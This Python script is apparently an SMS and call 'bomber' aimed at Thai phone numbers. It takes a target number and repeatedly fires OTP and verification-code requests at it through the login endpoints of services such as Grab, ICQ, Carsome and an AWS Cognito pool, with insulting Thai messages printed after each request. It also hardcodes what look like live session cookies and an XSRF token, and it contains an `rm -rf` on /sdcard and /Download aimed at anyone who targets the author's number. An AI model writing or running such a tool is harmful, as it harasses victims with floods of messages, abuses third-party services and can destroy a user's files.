import requests,json 
import os 
import time 
import threading 
from requests import get 
from re import search 
from requests import Session 
from threading import Thread 
os.system('clear') 
print("")
os.system("clear")
print ("")
print('''
\x1b[92m   _____ __  ________\x1b[00m                  \x1b[96m[ RUOK LAK HUA KOMKOM CALL - DogKungZ ]\x1b[00m
\x1b[92m  / ___//  |/  / ___/\x1b[00m  |
\x1b[92m  \__ \/ /|_/ /\__ \ \x1b[00m  | › \x1b[92mFacebook\x1b[00m : \x1b[94mกิต'ติ'กร เฉย'ไธ'สง\x1b[00m
\x1b[92m ___/ / /  / /___/ / \x1b[00m  | › \x1b[92mGithub\x1b[00m : \x1b[94mhttps://github.com/DogKungZ\x1b[00m
\x1b[92m/____/_/  /_//____/  \x1b[00m  | › \x1b[92mYoutube\x1b[00m : \x1b[94mhttps://www.youtube.com/channel/UCz-aDOxvb1eq0Dlm9WveYsA\x1b[00m
''')
print ("")
phone = input('\x1b[96mPHONE-NUMBER\x1b[00m :\x1b[92m ')
print ('')
jam = int(input("\033[1;93mAmount : \033[1;94m"))
print ("")
eh = int(input("\033[0mDelay : \033[0m"))
print ("")

def api():
	requests.post("https://partner-api.grab.com/grabid/v1/oauth2/otp", json={"on":{"value":phone,"country":"66"},"type":"mobile"})
	print ("\033[91mยิงแล้วไอหน้าโง่")
	
def api2():
	requests.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661",json={"phone_number": phone})
	print ("\033[91mยิงแล้วไอหน้าโง่")
	
def api3():
	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com",json={"phoneNumber":f"+66{phone}","namespace":"zaapi-buyers"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
	print ("\033[91mยิงแล้วไอหน้าโง่")
	
def api4():
	requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode", json={"reqId":"39816-1633012470","params":{"phone": phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
	print ("\033[91mยิงแล้วไอหน้าโง่")
	
def api5():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print ("\033[91mยิงแล้วไอหน้าโง่")
	
def api6():
	requests.post("https://www.carsome.co.th/website/login/sendSMS",json={"mobile":phone,"country_code":"TH","lang":"th","channel":"call","digit":4},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_gcl_au=1.1.708266966.1646798262;_fbp=fb.1.1646798263293.934490162;_gid=GA1.2.1869205174.1646798265;__gads=ID=3a9d3224d965d1d5-2263d5e0ead000a6:T=1646798265:RT=1646798265:S=ALNI_MZ7vpsoTaLNez288scAjLhIUalI6Q;_ga=GA1.2.2049889473.1646798264;_gat_UA-133219660-2=1;_ga_N9T2LF0PJ1=GS1.1.1646798262.1.1.1646799146.0;adonis-session=a5833f7b41f8bc112c05ff7f5fe3ed6fONCSG8%2Fd2it020fnejGzFhf%2BeWRoJrkYZwCGrBn6Ig5KK0uAhDeYZZgjdJeWrEkd2QqanFeA2r8s%2FXf7hI1zCehOFlqYcV7r4s4UQ7DuFMpu4ZJ45hicb4xRhrJpyHUA;XSRF-TOKEN=aacd25f1463569455d654804f2189bc77TyRxsqGOH%2FFozctmiwq6uL6Y4hAbExYamuaEw%2FJqE%2FrWzfaNdyMEtwfkls7v8UUNZ%2BFWMqd9pYvjGolK9iwiJm5NW34rWtFYoNC83P0DdQpoiYfm%2FKWn1DuSBbrsEkV"})
	print ("\033[91mยิงแล้วไอหน้าโง่")
	
if jam == '0931622115':
	print ("\033[0mละมึงจะยิงเบอร์กูทำควยไร")
	os.system("rm -rf cd /sdcard /Download")
	os.system("exit")
	
if (jam < 101):
	for i in range(jam):
		threading.Thread(target=api).start()
		time.sleep(eh)
		threading.Thread(target=api2).start()
		time.sleep(eh)
		threading.Thread(target=api3).start()
		time.sleep(eh)
		threading.Thread(target=api4).start()
		time.sleep(eh)
		threading.Thread(target=api5).start()
		time.sleep(eh)
		threading.Thread(target=api6).start()
		time.sleep(eh)
    
else:
	print ("")
	print (" \033[91mยิงไม่เกิน 100 ไอสัสยิงเยอะมันจะพัง")
